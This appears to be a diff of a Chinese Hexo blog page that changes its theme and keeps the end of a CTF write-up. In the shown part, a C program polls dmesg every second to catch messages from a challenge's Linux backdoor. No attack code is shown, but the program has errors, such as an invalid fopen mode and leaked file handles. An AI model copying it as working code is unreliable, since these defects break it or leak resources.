+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">compareFile</span><span class="hljs-params">(FILE *old, FILE *<span class="hljs-keyword">new</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>&#123;<br>    FILE *<span class="hljs-keyword">new</span>;<br>    FILE *old;<br>    <span class="hljs-keyword">int</span> lRet;<br>    <span class="hljs-keyword">static</span> first = <span class="hljs-number">0</span>;<br>    <br>    system(<span class="hljs-string">"touch file_new"</span>);<br>    system(<span class="hljs-string">"touch file_old"</span>);<br><br>    <span class="hljs-keyword">new</span> = fopen(<span class="hljs-string">"file_new"</span>, <span class="hljs-string">"rw"</span>);<br>    old = fopen(<span class="hljs-string">"file_old"</span>, <span class="hljs-string">"rw"</span>);<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;   <br>        sleep(<span class="hljs-number">1</span>);<br>        system(<span class="hljs-string">"dmesg &gt; file_new"</span>);<br>    <br>        <span class="hljs-keyword">if</span> (first == <span class="hljs-number">0</span>)<br>        &#123;   <br>            system(<span class="hljs-string">"cp file_new file_old"</span>);<br>            first++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;   <br><br>        <span class="hljs-keyword">new</span> = fopen(<span class="hljs-string">"file_new"</span>, <span class="hljs-string">"rw"</span>);<br>        old = fopen(<span class="hljs-string">"file_old"</span>, <span class="hljs-string">"rw"</span>);<br>    <br>        <span class="hljs-keyword">if</span> (compareFile(<span class="hljs-keyword">new</span>, old) == <span class="hljs-number">0</span>)<br>        &#123;   <br>            fclose(<span class="hljs-keyword">new</span>);<br>            fclose(old);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;   <br>        <span class="hljs-keyword">else</span><br>        &#123;   <br>            fclose(<span class="hljs-keyword">new</span>);<br>            fclose(old);<br>    <br>            system(<span class="hljs-string">"diff file_new file_old"</span>);<br>            system(<span class="hljs-string">"cp file_new file_old"</span>);<br>        &#125;  <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">compareFile</span><span class="hljs-params">(FILE *old, FILE *<span class="hljs-keyword">new</span>)</span><br></span>&#123;<br>    <span class="hljs-keyword">char</span> c1;<br>    <span class="hljs-keyword">char</span> c2;<br><br>    <span class="hljs-keyword">while</span>(!feof(old) &amp;&amp; !feof(<span class="hljs-keyword">new</span>))<br>    &#123;<br>        c1 = fgetc(old);<br>        c2 = fgetc(<span class="hljs-keyword">new</span>);<br><br>        <span class="hljs-keyword">if</span> (c1 != c2)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((c1 == EOF)&amp;&amp;(c2 == EOF))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>编译运行并跑起来即可</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>遇到之前没遇到的东西一定不能能慌,说不定非常简单(我真是个菜鸡hhh</p>
 <p>F5大法得到的东西诡异不如直接阅读反汇编代码</p>
 <p>不过也学到了如何与linux后门进行交互,感谢出题人的良苦用心</p>
 <p><a href="https://nightrainy.github.io/2019/10/31/play-with-docker/">原文链接:https://nightrainy.github.io/2019/10/31/play-with-docker/</a></p>
 
-      
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/11/02/教练-我还想用IO/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">教练,我还想用IO</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/08/07/play-withe-file-structure-搬运/">
+                        <span class="hidden-mobile">play withe file structure(搬运)</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://nightRainy.github.io/2019/10/31/play-with-docker/" data-id="ckmk33060000g7gjdzaogr00o" class="article-share-link">
-        Share
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
       </a>
-      
-    </footer>
+    
 
-  </div>
-
-  
-  
-<nav class="article-nav">
-  
-  <a href="/2019/11/02/教练-我还想用IO/" class="article-nav-link">
-    <strong class="article-nav-caption">Newer</strong>
-    <div class="article-nav-title">
-      
-      教练,我还想用IO
-      
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-  </a>
-  
-  
-  <a href="/2019/08/07/play-withe-file-structure-搬运/" class="article-nav-link">
-    <strong class="article-nav-caption">Older</strong>
-    <div class="article-nav-title">play withe file structure(搬运)</div>
-  </a>
-  
-</nav>
-
-  
-
-  
-  
-  
-  
-
-</article>
-</section>
-    <footer class="footer">
-  <div class="outer">
-    <div class="float-right">
-      <ul class="list-inline">
-  
-  <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
-  
-  <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
-  
-</ul>
-    </div>
-    <ul class="list-inline">
-      <li>知世の小屋 &copy; 2021</li>
-      
-      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
-      <li>theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
-    </ul>
   </div>
-</footer>
+</div>
+    
+
+    
   </main>
-  <aside class="sidebar">
-    <button class="navbar-toggle"></button>
-<nav class="navbar">
-  
-  <div class="logo">
-    <a href="/"><img src="/images/hexo.svg" alt="知世の小屋"></a>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
   </div>
   
-  <ul class="nav nav-main">
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/">主页</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/archives">归档</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/gallery">相册</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link" href="/about">关于</a>
-    </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link nav-item-search" title="Search">
-        <i class="fe fe-search"></i>
-        Search
-      </a>
-    </li>
-  </ul>
-</nav>
-<nav class="navbar navbar-bottom">
-  <ul class="nav">
-    <li class="nav-item">
-      <div class="totop" id="totop">
-  <i class="fe fe-rocket"></i>
-</div>
-    </li>
-    <li class="nav-item">
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css">
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/events.js"></script>
+<script src="/js/plugins.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/img-lazyload.js"></script>
+  
+
+
+
+  
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js"></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
       
-      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
-        <i class="fe fe-feed"></i>
-      </a>
+      typing(title)
       
-    </li>
-  </ul>
-</nav>
-<div class="search-form-wrap">
-  <div class="local-search local-search-plugin">
-  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
-  <div id="local-search-result" class="local-search-result"></div>
-</div>
-</div>
-  </aside>
-  <script src="/js/jquery-2.0.3.min.js"></script>
-<script src="/js/jquery.justifiedGallery.min.js"></script>
-<script src="/js/lazyload.min.js"></script>
-<script src="/js/busuanzi-2.3.pure.min.js"></script>
-
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    })(window, document);
+  </script>
 
 
 
+  <script src="/js/local-search.js"></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
 
 
-<script src="/js/ocean.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script src="/js/boot.js"></script>
+
+
 </body>
-
 </html>
